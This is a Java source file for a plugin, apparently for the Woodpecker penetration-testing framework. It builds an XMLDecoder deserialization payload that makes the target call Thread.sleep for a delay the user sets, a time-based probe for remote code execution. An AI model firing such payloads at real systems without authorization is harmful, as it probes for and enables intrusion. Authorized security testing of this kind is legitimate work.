package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class SleepPayloadGenerator implements IHelper {

    public String getHelperTabCaption() {
        return "sleep";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XMLDecoderPlugin.pluginHelper.createArg();
        args1.setName("sleep_time");
        args1.setDefaultValue("10");
        args1.setDescription("延时时间");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        int sleep_time = Integer.valueOf((String) customArgs.get("sleep_time"));
        sleep_time = sleep_time * 1000;
        String payload = String.format("<java>\n" +
                "    <object class=\"java.lang.Thread\">\n" +
                "        <void method=\"sleep\">\n" +
                "            <long>%d</long>\n" +
                "        </void>\n" +
                "    </object>\n" +
                "</java>",sleep_time);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
